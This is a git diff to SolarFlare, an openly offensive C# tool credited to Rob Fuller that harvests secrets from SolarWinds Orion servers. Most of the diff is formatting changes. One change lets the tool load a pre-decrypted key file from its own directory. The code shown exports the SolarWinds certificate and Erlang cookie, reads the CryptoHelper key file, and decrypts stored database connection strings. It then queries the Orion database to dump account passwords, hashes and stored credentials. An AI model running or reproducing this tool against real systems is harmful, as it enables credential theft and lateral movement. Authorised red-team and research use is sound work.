@@ -16,14 +16,14 @@ namespace SolarFlare
 	{
 		internal static FlareData flare = new FlareData();
 		static void Main(string[] args)
-        {
+		{
 			Console.WriteLine("Don't look directly into the sun...");
 			Console.WriteLine("Tool created by Rob Fuller (@mubix)");
 			Console.WriteLine("============================================");
-			if(args.Length > 0)
+			if (args.Length > 0)
 			{
 				string path = args[0];
-				if(File.Exists(path))
+				if (File.Exists(path))
 				{
 					using (StreamReader streamReader = File.OpenText(path))
 					{
@@ -47,9 +47,9 @@ namespace SolarFlare
 			}
 			Console.WriteLine("============================================");
 			Console.WriteLine("| Collecting RabbitMQ Erlang Cookie");
-            		flare.ErlangCookie = GetErlangCookie();
-			if(!(string.IsNullOrEmpty(flare.ErlangCookie)))
-            		{
+			flare.ErlangCookie = GetErlangCookie();
+			if (!(string.IsNullOrEmpty(flare.ErlangCookie)))
+			{
 				Console.WriteLine("| \tErlang Cookie: " + flare.ErlangCookie);
 			}
 			else
@@ -60,7 +60,7 @@ namespace SolarFlare
 			Console.WriteLine("============================================");
 			Console.WriteLine("| Collecting SolarWinds Certificate");
 			flare.CertData = GetCertificate();
-			if(flare.CertData.IsPresent)
+			if (flare.CertData.IsPresent)
 			{
 				Console.WriteLine("| \tSubject Name: " + flare.CertData.Cert.Subject);
 				Console.WriteLine("| \tThumbprint  : " + flare.CertData.Cert.Thumbprint);
@@ -129,7 +129,8 @@ namespace SolarFlare
 			string randompath = Path.GetRandomFileName();
 			solarcert.Password = randompath.Replace(".", "");
 			System.Security.Cryptography.X509Certificates.X509Store store1 = new X509Store(StoreName.My, StoreLocation.LocalMachine);
-			using (File.Create("C:\\Windows\\Temp\\SolarFlare")) { };
+			using (File.Create("C:\\Windows\\Temp\\SolarFlare")) { }
+			;
 			store1.Open(OpenFlags.ReadOnly);
 			solarcert.IsPresent = false;
 			solarcert.Exported = false;
@@ -162,11 +163,29 @@ namespace SolarFlare
 		static FlareData.DatHex GetDat()
 		{
 			FlareData.DatHex dat = new FlareData.DatHex();
-			string path = Environment.GetEnvironmentVariable("programdata");
-			path += "\\SolarWinds\\KeyStorage\\CryptoHelper\\default.dat";
-			if (File.Exists(path))
+			string programDataPath = Environment.GetEnvironmentVariable("programdata");
+			string defaultDatPath = programDataPath + "\\SolarWinds\\KeyStorage\\CryptoHelper\\default.dat";
+			string exeDir = AppDomain.CurrentDomain.BaseDirectory;
+			string decFilePath = Path.Combine(exeDir, "default.dat.dec");
+
+			if (File.Exists(decFilePath))
 			{
-				using (BinaryReader binaryReader = new BinaryReader(File.Open(path, FileMode.Open, FileAccess.Read, FileShare.Read)))
+				try
+				{
+					dat.DatDecrypted = File.ReadAllBytes(decFilePath);
+					dat.DatDecryptedHex = BitConverter.ToString(dat.DatDecrypted).Replace("-", "");
+					dat.Decrypted = true;
+					dat.IsPresent = true;
+					Console.WriteLine("| \tLoaded decrypted DAT from: " + decFilePath);
+				}
+				catch (Exception e)
+				{
+					Console.WriteLine("| \tFailed to read default.dat.dec: " + e.Message);
+				}
+			}
+			else if (File.Exists(defaultDatPath))
+			{
+				using (BinaryReader binaryReader = new BinaryReader(File.Open(defaultDatPath, FileMode.Open, FileAccess.Read, FileShare.Read)))
 				{
 					int keyid = binaryReader.ReadInt32();
 					int count = binaryReader.ReadInt32();
@@ -233,12 +252,12 @@ namespace SolarFlare
 			// Add the Encryption Option(s)
 			if (connString.ContainsKey("encrypt"))
 			{
-				if(connString["encrypt"].ToUpper() == "TRUE")
+				if (connString["encrypt"].ToUpper() == "TRUE")
 				{
 					cred.DbEncrypted = true;
-					if(connString.ContainsKey("trustservercertificate"))
+					if (connString.ContainsKey("trustservercertificate"))
 					{
-						if(connString["trustservercertificate"].ToUpper() == "TRUE")
+						if (connString["trustservercertificate"].ToUpper() == "TRUE")
 						{
 							cred.DbTrustCert = true;
 						}
@@ -382,27 +401,27 @@ namespace SolarFlare
 
 		static bool CheckDbConnection()
 		{
-			if(flare.Db.Credentials.Count > 0)
+			if (flare.Db.Credentials.Count > 0)
 			{
-				foreach(FlareData.FlareDB.DbCredential sql in flare.Db.Credentials)
+				foreach (FlareData.FlareDB.DbCredential sql in flare.Db.Credentials)
 				{
 					try
-                    {
+					{
 						SqlConnection sqlconn = new SqlConnection();
 						sqlconn.ConnectionString = "Data Source=" + sql.DbHost + ";Initial Catalog=" + sql.DbDB + ";User ID=" + sql.DbUser + ";Password=" + sql.DbPass;
 						sqlconn.ConnectionString += ";MultipleActiveResultSets=true";
-						if(sql.DBIntegratedSecurity == true)
-                        {
+						if (sql.DBIntegratedSecurity == true)
+						{
 							sqlconn.ConnectionString += $";Integrated Security={sql.DBIntegratedSecurityString}";
-                        }
-						if(sql.DbEncrypted == true)
-                        {
+						}
+						if (sql.DbEncrypted == true)
+						{
 							sqlconn.ConnectionString += ";encrypt=True";
-							if(sql.DbTrustCert == true)
-                            {
+							if (sql.DbTrustCert == true)
+							{
 								sqlconn.ConnectionString += ";trustservercertificate=True";
 							}
-                        }
+						}
 						try
 						{
 							sqlconn.Open();
@@ -420,13 +439,13 @@ namespace SolarFlare
 						}
 					}
 					catch
-                    {
+					{
 						Console.WriteLine($"| \t CONNECTION STRING INVALID: Data Source = " + sql.DbHost + "; Initial Catalog = " + sql.DbDB + "; User ID = " + sql.DbUser + "; Password = " + sql.DbPass);
-                    }
+					}
 
 				}
 			}
-			if(flare.Db.Connection != null && flare.Db.Connection.State == System.Data.ConnectionState.Open)
+			if (flare.Db.Connection != null && flare.Db.Connection.State == System.Data.ConnectionState.Open)
 			{
 				return true;
 			}
@@ -447,7 +466,7 @@ namespace SolarFlare
 				new System.Security.Cryptography.Xml.EncryptedXml(xmlDocument).DecryptDocument();
 				decrypted = xmlDocument.FirstChild.InnerText;
 			}
-			else if(encString.StartsWith("-"))
+			else if (encString.StartsWith("-"))
 			{
 				decrypted = DecryptAes(encString);
 			}
@@ -610,7 +629,7 @@ namespace SolarFlare
 				TableNames.Add(row[2].ToString());
 			}
 
-			if(TableNames.Contains("Key"))
+			if (TableNames.Contains("Key"))
 			{
 				Console.WriteLine("============================================");
 				Console.WriteLine("| DB - Exporting Key Table                 |");
@@ -683,7 +702,7 @@ namespace SolarFlare
 		{
 			List<string> columnlist = new List<string>();
 			columnlist = GetColumnList("Accounts");
-			if(columnlist.Contains("Password"))
+			if (columnlist.Contains("Password"))
 			{
 				using (SqlCommand command = new SqlCommand("SELECT accountid, password, " +
 					"passwordhash, accountenabled, allowadmin, lastlogin, accountsid, " +
@@ -713,7 +732,7 @@ namespace SolarFlare
 
 			}
 			else if (!(columnlist.Contains("PasswordSalt")))
-            {
+			{
 				using (SqlCommand command = new SqlCommand("SELECT accountid," +
 					"passwordhash, accountenabled, allowadmin, lastlogin, accountsid, " +
 					"groupinfo from [dbo].[Accounts]", flare.Db.Connection))
@@ -829,7 +848,7 @@ namespace SolarFlare
 					reader.Close();
 				}
 			}
-			catch(Exception e)
+			catch (Exception e)
 			{
 				Console.WriteLine("| Credential table not found or we had a decryption error... That's weird...");
 				Console.WriteLine("| Exception: " + e);
